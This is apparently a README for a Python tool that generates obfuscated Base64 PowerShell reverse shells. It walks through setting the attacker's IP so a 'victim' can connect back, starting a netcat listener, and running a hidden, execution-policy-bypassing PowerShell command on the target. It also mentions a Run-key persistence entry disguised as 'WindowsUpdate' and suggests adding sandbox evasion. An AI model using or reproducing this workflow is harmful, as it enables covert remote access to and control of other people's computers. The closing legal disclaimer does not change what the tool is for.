# PowerShell Reverse Shell Generator

A Python-based utility for generating obfuscated Base64-encoded PowerShell reverse shells.

## Features
- IP/Port configuration through command-line arguments
- Automatic Base64 encoding with proper UTF-16LE conversion
- Basic anti-analysis patterns
- Error handling integration

## Prerequisites
- Python 3.6+
- PowerShell 5.0+

## IP Configuration
To get your IP address on your local Ubuntu machine, use one of the following methods:

1. Get Your Local (Private) IP Address (for LAN use)
Run:

```bash
ip a
```
or 

```bash
hostname -I
```
This will show the IP assigned by your router (e.g., 192.168.x.x or 10.x.x.x).

1. Get Your Public IP Address (for WAN use)
Run:

```bash
curl ifconfig.me
```
or

```bash
curl -s http://checkip.amazonaws.com
```
This will show the public IP assigned by your ISP, which is needed if you're connecting from an external network.

Note:

If you want a victim from another network to connect to your machine, use your public IP and ensure your router forwards the listening port to your local machine.

If the victim is on the same network, use your local IP instead.

## Usage

1. Clone the repository:
```bash
git clone https://github.com/Ethixlucifer/powershell-win1.git
cd powershell-win1
```

2. Generate payload:
```bash
python rshell.py -i 192.168.1.100 -p 2222
```

3. Start listener (on attacker machine):
```bash
nc -nvlp 2222
```

4. Execute generated command on target machine

## Example Output
```powershell
Start-Process powershell -ArgumentList "-ep bypass -e {b64_final}" -WindowStyle Hidden
```
## reverse shell termination
```powershell
# Remove registry entry
Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name WindowsUpdate

# Kill active sessions
Get-CimInstance Win32_Process | Where-Object { 
    $_.CommandLine -like "*WindowsUpdate*" 
} | Stop-Process -Force
```

## Important Notes
- Always test payloads in controlled environments
- Use proper network encryption (SSL/TLS)
- Consider adding sandbox evasion techniques
- Maintain strict version control for detection testing

## Legal Disclaimer
This tool is intended for:
- Authorized penetration testing
- Educational purposes
- Security research

```powershell
Always obtain proper authorization before using this tool against any network or system. I ethixlucifer is not liable for any discripent use of this tool. I purely built it for the testing purpose with no intention to be used in a production / real-world scenario.
```